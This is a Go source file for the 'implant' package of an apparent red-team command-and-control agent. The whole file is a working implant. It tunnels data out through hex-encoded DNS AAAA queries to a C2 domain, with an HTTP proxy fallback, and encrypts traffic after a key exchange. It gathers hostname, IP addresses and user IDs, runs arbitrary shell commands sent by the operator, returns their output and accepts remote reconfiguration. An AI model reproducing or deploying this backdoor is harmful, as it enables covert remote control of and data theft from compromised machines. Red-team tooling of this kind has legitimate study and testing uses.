package implant

import (
	"context"
	"crypto"
	"crypto/md5"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"sort"
	"strings"

	"github.com/miekg/dns"
	"github.com/slackr/redchannel-agent/config"
	"google.golang.org/protobuf/proto"
)

/** String obfuscation from https://github.com/unixpickle/gobfuscate

(func() string {
	s := []byte{0xde, 0xcf, 0xd9, 0xde}
	key := 0xAA
	for i, c := range s {
		s[i] = byte(int(c) ^ key)
	}
	return string(s)
}())
*/

type RecordType int

const (
	DNS_TXT RecordType = 0x00
	DNS_A   RecordType = 0x01
)

const AGENT_ID_LEN = 8

const SENDQ_CHUNK_LEN = 32
const DATA_ID_LEN = 4
const DATA_PAD_CHAR = "f"

const AES_GCM_NONCE_LEN = 12
const AES_BLOCK_LEN = 16

const RECORD_HEADER_PREFIX = "ff00"
const RECORD_DATA_PREFIX = "2001"

const PROXY_DATA_SEPARATOR = ";"

// Agent class holds all agent data, including sendq and recvq, passwords, id, crypto object
type Agent struct {
	privkey  crypto.PrivateKey
	pubkey   crypto.PublicKey
	resolver *net.Resolver
	id       string
	password string
	crypto   Crypto
	sendq    map[string]AgentCommand                    // map["010FF.chunk"] = 0xff
	recvq    map[AgentCommand]map[string]map[int][]byte // map[0x01] = ["data_id"] = [0 = chunk1, 1 = chunk2]
	sentKey  bool
	config   config.Config
	shutdown bool
}

// Init will initialize the agent, generate a new agent ID and new keys
func (a *Agent) Init() {
	a.config = config.Config{}
	a.config.Init()

	a.shutdown = false

	a.crypto = Crypto{}

	a.sendq = make(map[string]AgentCommand)
	a.recvq = make(map[AgentCommand]map[string]map[int][]byte)

	a.NewAgentID()
	a.NewKeys()
}

func (a *Agent) GetC2Interval() int {
	return a.config.C2Interval
}
func (a *Agent) IsShutdown() bool {
	return a.shutdown
}

// NewKeys is a wrapper for Crypto.GenerateKeys()
func (a *Agent) NewKeys() {
	a.crypto.GenerateKeys()
}

// CheckIn queues up a CHECKIN command with dummy data
func (a *Agent) CheckIn() {
	if a.config.ProxyEnabled == true {
		var proxyData = a.GetFromProxy()
		if len(proxyData) > 0 {
			a.ProcessResponse(proxyData)
		} else {
			log.Printf("no data from proxy c2\n")
		}
	}
	// if we don't have a computed secret yet, we will send dummy data with our checkin
	// this will be our first ping if the c2 doesn't know about us yet.
	// c2 may error out trying to decrypt the dummy payload if an agent is already checked in
	// the operator may choose to delete the agent and allow first ping again
	if a.crypto.secret == nil {
		log.Printf("checking in with dummy data (no secret computed yet)\n")
		a.CleanupSendQ(AgentCommand_AGENT_CHECKIN)
		a.QueueData(AgentCommand_AGENT_CHECKIN, []byte{0xff})
		return
	}
	if !a.IsCommandInSendQ(AgentCommand_AGENT_CHECKIN) {
		log.Printf("checking in with encrypted data\n")
		a.SendEncrypted(a.crypto.RandomBytes(6), AgentCommand_AGENT_CHECKIN)
	}
}

// SendEncrypted will encrypt a message byte array and add it to the sendq
func (a *Agent) SendEncrypted(message []byte, command AgentCommand) {
	if a.crypto.secret == nil {
		log.Printf("error cannot send encrypted, start keyx first\n")
		return
	}

	var data []byte
	if command == AgentCommand_AGENT_KEYX {
		data = message
	} else {
		commandResponse := &Command_Response{}
		commandResponse.Output = message
		commandResponse.Status = AgentCommandStatus_STATUS_SUCCESS
		commandResponseProto, marshalError := proto.Marshal(commandResponse)
		if marshalError != nil {
			log.Printf("failed marshal command response: %x (err: %q)\n", commandResponse, marshalError)
			return
		}
		data = commandResponseProto
	}

	ciphertext, err := a.crypto.EncryptAesCbc(data, a.crypto.secret)
	if err != nil {
		log.Printf("error encrypting message: %q (err: %q)\n", message, err)
		return
	}

	a.QueueData(command, ciphertext)
}

// Keyx will send the hex string crypto pubkey using QueueData
// The sendq will be wiped of any pending keyx commands
func (a *Agent) Keyx() {
	if a.crypto.pubkey == nil {
		a.NewKeys()
	}

	a.CleanupSendQ(AgentCommand_AGENT_KEYX)
	a.QueueData(AgentCommand_AGENT_KEYX, a.crypto.pubkey)
}

// QueueData queues up the data string as DNS queries to be
// made by ProcessSendQ
func (a *Agent) QueueData(command AgentCommand, bytes []byte) {
	data := BytesToHexString(bytes)

	chunkSplitRegex := fmt.Sprintf("[a-f0-9]{1,%d}", SENDQ_CHUNK_LEN)
	chunks := regexp.MustCompile(chunkSplitRegex).FindAllString(data, -1)
	totalChunks := len(chunks)

	// unique-ish identifier for each sent command to aide in reconstruction
	dataId := a.crypto.RandomHexString(DATA_ID_LEN)

	for chunkNumber, chunkData := range chunks {
		//log.Printf("chunk %d: %s\n", chunk_num, chunk_data)

		// [agent_id].[command][chunk_num][chunk_total].[data_id].[chunk].c2
		queueMessage := fmt.Sprintf("%s.%02x%02x%02x.%s.%s", a.id, command.Number(), chunkNumber, totalChunks, dataId, chunkData)
		//log.Printf("q: %s\n", q)

		// TODO: need a better structure
		a.sendq[queueMessage] = command
	}
}

// Run executes the functions required by the main loop
func (a *Agent) Run() {
	a.ProcessSendQ()
	a.CheckIn()
}

// CleanupSendQ removes specified AgentCommand queue items
func (a *Agent) CleanupSendQ(cleanupCommand AgentCommand) {
	for item, command := range a.sendq {
		if command == cleanupCommand {
			log.Printf("removed from sendq: %q\n", item)
			delete(a.sendq, item)
		}
	}
}

// CleanupSendQ removes specified AgentCommand queue items
func (a *Agent) IsCommandInSendQ(cleanupCommand AgentCommand) bool {
	for _, command := range a.sendq {
		if command == cleanupCommand {
			return true
		}
	}
	return false
}

// ProcessSendQ is called by agent loop to send data back to c2
func (a *Agent) ProcessSendQ() {
	if a.config.ProxyEnabled == true {
		var data []string

		var commandsSent []AgentCommand
		for item, command := range a.sendq {
			antiCacheValue := a.crypto.RandomHexString(4)
			segment := antiCacheValue + "." + item
			data = append(data, segment)
			commandsSent = append(commandsSent, command)
		}
		if len(data) > 0 {
			a.SendToProxy(data)
			for i := range commandsSent {
				a.CleanupSendQ(commandsSent[i])
			}
		}
		return
	}

	for sendQItem := range a.sendq {
		// first 4 bytes will be randomized for every request to prevent dns caching
		antiCacheValue := a.crypto.RandomHexString(4)
		query := antiCacheValue + "." + sendQItem + "." + a.config.C2Domain

		// var err error
		var c2Response []string

		dnsMessage := new(dns.Msg)
		dnsMessage.SetQuestion(query+".", dns.TypeAAAA)
		dnsMessage.RecursionDesired = true
		dnsClient := new(dns.Client)
		dnsResponse, _, err := dnsClient.Exchange(dnsMessage, a.config.Resolver)
		// log.Printf("raw: %s %s %s", in, rtt, err)
		if err != nil {
			// fmt.Printf("Error getting the IPv6 address: %s\n", err)
		} else if dnsResponse.Rcode != dns.RcodeSuccess {
			// fmt.Printf("Error getting the IPv6 address: %s\n", dns.RcodeToString[in.Rcode])
		} else {
			for _, record := range dnsResponse.Answer {
				switch recordType := record.(type) {
				case *dns.AAAA:
					c2Response = append(c2Response, recordType.AAAA.String())
				}
			}
		}

		// r := &net.Resolver{
		// 	PreferGo: true,
		// 	Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
		// 		print(a.config.Resolver)
		// 		d := net.Dialer{
		// 			Timeout: time.Millisecond * time.Duration(10000),
		// 		}
		// 		// on Windows, custom resolvers do not work, it'll always use the OS resolver
		// 		return d.DialContext(ctx, network, a.config.Resolver)
		// 	},
		// }
		// ip, _ := r.LookupHost(context.Background(), query)
		// log.Printf("ips: %s\n",ip[0])

		if len(c2Response) > 0 {
			// process response
			log.Printf("c2 response for %q: %s\n", query, c2Response)
			delete(a.sendq, sendQItem)
			a.ProcessResponse(c2Response)
		} else {
			log.Printf("c2 response for: %q was empty\n", query)
		}

		// response, err = net.LookupHost(query)
		// if err != nil {
		// 	log.Printf("error looking up %q (err: %q)\n", query, err)
		// }
		// if response != nil {
		// 	// process response
		// 	log.Printf("c2 response for %q: %s\n", query, response)
		// 	delete(a.sendq, item)
		// 	a.ProcessResponse(response)
		// }

		// only one SendQ item at a time if throttled
		if a.config.ThrottleSendQ {
			return
		}
	}
}

/**
 * ProcessResponse queues up data to send when agent checks in next
 * 2001:[record_num]:[4 byte data]:...
 *
 * first IP in each command must be the data identifier for agent to track
 * ff00:[data_id]:[command][padded_bytes_count]:[total_records]:[4 byte reserved data]:...
 *
 * old data should be purged when new data comes in for a command
 */
func (a *Agent) ProcessResponse(response []string) {
	var err error
	command := 0
	totalRecords := 0
	paddedBytesCount := 0
	var dataId string

	headerFound := false

	// look for the header because fucking go doesn't return the records in order
	headerIndex := 0
	for i := range response {
		if strings.HasPrefix(response[i], RECORD_HEADER_PREFIX) == true {
			headerFound = true
			headerIndex = i

			ipv6 := net.ParseIP(response[i])
			if ipv6 == nil {
				log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", response[i])
				return
			}
			expandedIpv6 := ExpandIPv6(ipv6)
			blocks := strings.Split(expandedIpv6, ":")

			command, err = HexBytesToInt(blocks[2][:2])
			if err != nil {
				log.Printf("error decoding command from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}

			if AgentCommand(command) == AgentCommand_AGENT_IGNORE {
				return
			}

			dataId = blocks[1]
			if _, ok := a.recvq[AgentCommand(command)]; !ok {
				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
			}
			if _, ok2 := a.recvq[AgentCommand(command)][dataId]; !ok2 {
				delete(a.recvq, AgentCommand(command)) // delete old command data
				a.recvq[AgentCommand(command)] = map[string]map[int][]byte{}
				a.recvq[AgentCommand(command)][dataId] = map[int][]byte{}
			}

			paddedBytesCount, err = HexBytesToInt(blocks[2][2:4])
			if err != nil {
				log.Printf("error decoding padded bytes count from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}
			totalRecords, err = HexBytesToInt(blocks[3])
			if err != nil {
				log.Printf("error decoding total records from c2 response: %q, (err: %q)\n", response[i], err)
				return
			}
		}
	}

	if !headerFound {
		log.Printf("error, no header found in c2 response: %q\n", response)
		return
	}

	// remove the header
	finalResponse := append(response[:headerIndex], response[headerIndex+1:]...)

	for i := range finalResponse {
		if len(finalResponse[i]) < 10 {
			continue
		}
		ipv6 := net.ParseIP(finalResponse[i])
		if ipv6 == nil {
			log.Printf("error parsing ipv6 in c2 response: %q, invalid ip\n", finalResponse[i])
			return
		}
		expandedIpv6 := ExpandIPv6(ipv6)
		blocks := strings.Split(expandedIpv6, ":")

		recordNumber, err := HexBytesToInt(blocks[1])
		if err != nil {
			log.Printf("error decoding record num from c2 response: %q, (err: %q)\n", finalResponse[i], err)
			return
		}
		dataString := strings.Join(blocks[2:], "")
		data, err := HexStringToBytes(dataString)
		if err != nil {
			log.Printf("error decoding data from c2 response: %q, (err: %q)\n", finalResponse[i], err)
			return
		}

		a.recvq[AgentCommand(command)][dataId][recordNumber] = data

		receivedRecords := len(a.recvq[AgentCommand(command)][dataId])
		if receivedRecords == totalRecords {
			a.ProcessRecvQ(AgentCommand(command), dataId, paddedBytesCount)
		}
		//log.Printf("r %d / %d\n", received_records, total_records)
	}
}

func (a *Agent) ProcessRecvQ(command AgentCommand, data_id string, padded_bytes_count int) {
	var data []byte

	sortedRecords := make([]int, len(a.recvq[command][data_id]))
	for rec := range a.recvq[command][data_id] {
		sortedRecords = append(sortedRecords, rec)
	}
	sort.Ints(sortedRecords)

	for recordNumber := range sortedRecords {
		for i := range a.recvq[command][data_id][recordNumber] {
			data = append(data, a.recvq[command][data_id][recordNumber][i])
		}
	}

	data = data[:len(data)-padded_bytes_count]

	log.Printf("processed recv: %d: %x\n", command, data)
	delete(a.recvq, command)

	if command == AgentCommand_AGENT_KEYX {
		commandRequest, unmarshalError := unmarshalCommandRequest(data)
		if unmarshalError != nil {
			log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
			return
		}

		err := a.crypto.ComputeSharedSecret(commandRequest.Input, a.config.C2Password)
		if err != nil {
			log.Printf("failed to compute secret with pubkey: %x (err: %q)\n", data, err)
			return
		}
		a.Keyx()
		return
	}

	decryptedData, err := a.crypto.DecryptAesCbc(data, a.crypto.secret)
	if err != nil {
		log.Printf("error decrypting data for command %q: %x (err: %q)\n", command, data, err)
		return
	}

	commandRequest, unmarshalError := unmarshalCommandRequest(decryptedData)
	if unmarshalError != nil {
		log.Printf("failed unmarshal command request: %x (err: %q)\n", data, unmarshalError)
		return
	}
	decryptedData = commandRequest.Input

	switch command {
	case AgentCommand_AGENT_SYSINFO:
		var sysinfo = a.GetSysInfo()
		log.Printf("sysinfo: %s\n", sysinfo)
		a.SendEncrypted([]byte(sysinfo), AgentCommand_AGENT_SYSINFO)
		break
	case AgentCommand_AGENT_EXECUTE:
		cmd := string(decryptedData)
		args := strings.Fields(cmd)
		go func() {
			out, err := exec.Command(args[0], args[1:]...).Output()
			if err != nil {
				log.Printf("error executing: %s (err: %s)\n", cmd, err)
				a.SendEncrypted([]byte(err.Error()), AgentCommand_AGENT_MESSAGE)
				return
			}
			log.Printf("executed command: %s output: %s\n", cmd, out)
			a.SendEncrypted(out, AgentCommand_AGENT_MESSAGE)
		}()
		break
	case AgentCommand_AGENT_SET_CONFIG:
		newConfig := commandRequest.Config
		if newConfig.GetWebKey() != nil {
			a.config.ProxyKey = newConfig.GetWebKey().Value
		}
		if newConfig.GetWebUrl() != nil {
			a.config.ProxyUrl = newConfig.GetWebUrl().Value
		}
		if newConfig.GetUseWebChannel() != nil {
			a.config.ProxyEnabled = newConfig.GetUseWebChannel().Value
		}
		if newConfig.GetC2IntervalMs() != nil {
			a.config.C2Interval = int(newConfig.GetC2IntervalMs().Value)
		}
		log.Printf("updated config to: %s\n", commandRequest.GetConfig())

		break
	case AgentCommand_AGENT_MESSAGE:
		log.Printf("msg> %s\n", decryptedData)
		break
	case AgentCommand_AGENT_SHUTDOWN:
		log.Printf("shutting down...\n")
		a.SendEncrypted([]byte("shutting down..."), AgentCommand_AGENT_MESSAGE)
		a.ProcessSendQ()
		a.shutdown = true
		break
	}
}

func (a *Agent) SendToProxy(data []string) {
	dataString := strings.Join(data, PROXY_DATA_SEPARATOR) + PROXY_DATA_SEPARATOR
	log.Printf("sending data to proxy: %s\n", dataString)

	formData := url.Values{
		"p": {"a"},
		"k": {a.config.ProxyKey},
		"d": {dataString},
	}

	resp, err := http.PostForm(a.config.ProxyUrl, formData)
	if err != nil {
		log.Printf("could not send to proxy, err: %s\n", err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	if len(body) > 0 {
		log.Printf("proxy send response: '%s'\n", body)
	}
}
func (a *Agent) GetFromProxy() []string {
	log.Printf("checking in with proxy...\n")

	form_data := url.Values{
		"f": {"c"},
		"k": {a.config.ProxyKey},
		"i": {a.id},
	}

	var data []string
	resp, err := http.PostForm(a.config.ProxyUrl, form_data)
	if err != nil {
		log.Printf("could not read from proxy, err: %s\n", err)
		return data
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	// TODO: handle proxy response for OK_NO_DATA
	if len(body) > 0 {
		log.Printf("proxy get response: '%s'\n", string(body))
		data = strings.Split(string(body), PROXY_DATA_SEPARATOR)
	}
	return data
}

// SetDNSResolver attempts to force the process to use a custom resolver for queries
func (a *Agent) SetDNSResolver(nameserver string, port string) {
	if nameserver != "" {
		a.resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				d := net.Dialer{}
				return d.DialContext(ctx, "udp", net.JoinHostPort(nameserver, port))
			},
		}
	} else {
		a.resolver = net.DefaultResolver
	}
}

// NewAgentID sets that agent ID to a deterministic value
func (a *Agent) NewAgentID() {
	if len(a.id) == 0 {
		var as []string
		ifas, err := net.Interfaces()
		if err == nil {
			for _, ifa := range ifas {
				a := ifa.HardwareAddr.String()
				if a != "" {
					as = append(as, a)
				}
			}
		}

		hostname, err := os.Hostname()
		if err == nil {
			as = append(as, hostname)
		}
		hash := md5.Sum([]byte(strings.Join(as, "")))
		hashString := BytesToHexString(hash[:])

		a.id = hashString[:AGENT_ID_LEN]
	}
}

func (a *Agent) GetSysInfo() string {
	var sysinfo = ""

	var name, err = os.Hostname()
	if err != nil {
		name = "_"
	}

	var ips = ""
	interfaceAddresses, err := net.InterfaceAddrs()
	if err != nil {
		ips = "_"
	}

	for _, a := range interfaceAddresses {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				ip := ipnet.IP.String()
				if !strings.HasPrefix(ip, "169.254.") {
					ips = ips + ip + ","
				}
			}
		}
	}

	var username = ""
	u, err := user.Current()
	if err != nil {
		username = "_"
	} else {
		username = u.Username + ":" + u.Uid + ":" + u.Gid
	}
	sysinfo = name + ";" + ips + ";" + username
	return sysinfo
}
